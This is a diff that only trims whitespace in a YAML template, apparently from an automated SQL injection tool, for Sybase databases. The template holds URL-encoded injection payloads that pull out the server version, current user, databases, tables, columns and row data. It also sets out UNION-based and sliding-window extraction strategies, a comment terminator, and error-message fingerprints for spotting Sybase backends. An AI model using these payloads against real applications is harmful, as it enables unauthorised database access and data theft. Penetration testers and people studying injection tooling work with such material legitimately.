@@ -1,8 +1,8 @@
 vendor: Sybase
 
-resource: 
+resource:
  info: |
-  select 
+  select
       @@version
       %2B'${enclose_value_sql}'
       %2Bdb_name()
@@ -10,15 +10,15 @@ resource:
       %2Buser_name()
       %2B'${trail_sql}'
       r
-      
- schema: 
+
+ schema:
   database: |
-   select 
+   select
        rr
        %2b'${trail_sql}'
        r
    from (
-       select 
+       select
            '${enclose_value_sql}'
            %2bt.name
            %2b'${separator_qte_sql}0${enclose_value_sql}'
@@ -30,14 +30,14 @@ resource:
        group by t.name
        ${limit}
    ) a
-   
+
   table: |
-   select 
+   select
        rr
        %2b'${trail_sql}'
-       r 
+       r
    from (
-       select 
+       select
            '${enclose_value_sql}'
            %2bt.name
            %2b'${separator_qte_sql}0${enclose_value_sql}'
@@ -49,14 +49,14 @@ resource:
        group by t.name
        ${limit}
    ) a
-   
+
   column: |
-   select 
+   select
        rr
        %2b'${trail_sql}'
-       r 
+       r
    from (
-       select 
+       select
            '${enclose_value_sql}'
            %2bt.name
            %2b'${separator_qte_sql}0${enclose_value_sql}'
@@ -68,15 +68,15 @@ resource:
        group by t.name
        ${limit}
    ) a
-   
-  row: 
+
+  row:
    query: |
-    select 
+    select
         rr
         %2b'${trail_sql}'
         r
     from (
-        select 
+        select
             '${enclose_value_sql}'
             %2bt.s
             %2b'${separator_qte_sql}0${enclose_value_sql}'
@@ -88,23 +88,23 @@ resource:
         group by t.s
         ${limit}
     ) a
-   fields: 
+   fields:
     field: |
      rtrim(
          ltrim(
              convert(
-                 varchar, 
+                 varchar,
                  ${field.value}
                  %2b ''
              )
          )
      )
     concat: "%2b '%7f' %2b"
-    
-strategy: 
- configuration: 
+
+strategy:
+ configuration:
   slidingWindow: |
-   select 
+   select
        '${lead}'
        %2bsubstring(
            r,
@@ -116,24 +116,24 @@ strategy:
    ) x
   limit: having count(*) between ${limit.value} and ${limit.value}
   failsafe: |
-   select 
+   select
        convert(
-           varchar, 
+           varchar,
            (1337${indice}7330%2b1)
        ) r
   calibrator: replicate('${calibrator_sql}', 1024)
   limitBoundary: 1
   endingComment: --+-
-  fingerprint: 
-   errorMessage: 
+  fingerprint:
+   errorMessage:
     - "Warning: sybase_connect()"
     - "Warning: sybase_query()"
     - "Warning: sybase_fetch_row()"
     - "Sybase: Server message:"
     - Invalid SQL statement or JDBC escape, terminating '
     - sybase
-    
- normal: 
+
+ normal:
   indices: union select ${result_range} from (${indice_unique}) b
   capacity: (select '${lead}${indice}' %2b ${calibrator})
   orderBy: order by 1337
